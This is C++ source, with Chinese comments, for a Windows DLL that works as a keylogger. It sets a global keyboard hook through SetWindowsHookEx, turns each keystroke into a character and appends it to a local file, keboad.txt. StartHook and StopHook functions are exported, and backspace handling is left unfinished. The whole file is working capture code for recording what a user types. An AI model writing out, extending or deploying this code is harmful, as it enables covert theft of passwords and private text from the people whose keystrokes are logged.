// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include "KeboardHook.h"

#pragma data_seg("hfData")

HHOOK g_hHook = NULL;

HINSTANCE g_hInstance = NULL;

char *g_FileName = "keboad.txt";

#pragma data_seg()

LRESULT CALLBACK KeyboardProc(
		int nCode,
		WPARAM wParam,
		LPARAM lParam) 
{ 
	char ch = 0; 
	FILE *fl; 

	//
	//有键按下 
	//
	if( ((DWORD)lParam&0x40000000) && 
		(HC_ACTION == nCode) ) 
	{ 
		if((wParam==VK_SPACE)||(wParam==VK_RETURN)||(wParam>=0x2f ) &&(wParam<=0x100) ) 
		{ 
			fl=fopen(g_FileName,"a+"); 
			if (wParam==VK_RETURN) 
			{ 
				ch='\n'; 
			} 
			else { 
				BYTE ks[256]; 
				GetKeyboardState(ks); 
				WORD w; 
				UINT scan=0; 
				ToAscii(wParam,scan,ks,&w,0); 
				ch =char(w);  
			} 
			fwrite(&ch, sizeof(char), 1, fl); 
			fclose(fl);
		}  
		else if (wParam==VK_BACK)
		{
			//TODO
		}
		else {
			//TODO
		}
	} 
	return CallNextHookEx( g_hHook, nCode, wParam, lParam );  
} 

BOOL StartHook()
{
	BOOL bResult = FALSE;
	g_hHook = SetWindowsHookEx(
							WH_KEYBOARD,
							KeyboardProc,
							g_hInstance,0);
	if (g_hHook != NULL)
	{
		bResult = TRUE;
	}

	return bResult;
}

BOOL StopHook()
{
	BOOL bResult = FALSE;
	if (g_hHook)
	{
		bResult = UnhookWindowsHookEx(g_hHook);
        if (bResult)
        {
			g_hHook = NULL;
        }
	}

	return bResult;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	g_hInstance = hModule;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

